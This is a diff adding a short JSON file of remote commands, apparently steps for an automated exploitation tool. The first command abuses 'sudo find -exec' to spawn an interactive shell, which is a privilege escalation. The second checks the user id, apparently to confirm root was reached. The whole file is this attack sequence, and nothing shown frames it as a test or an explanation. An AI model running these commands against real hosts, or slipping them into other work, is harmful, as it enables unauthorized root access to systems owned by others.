@@ -1,0 +1,8 @@
+[
+	{
+		"TYPE" : "REMOTE", "CMD_TYPE" : "CMD", "CMD" : "sudo /usr/bin/find /home -exec sh -i \\;\n"
+	},
+    {
+        "TYPE" : "REMOTE", "CMD_TYPE" : "CMD", "CMD" : "echo $(id -u)\n", "RECV" : "privilege"
+    }
+]
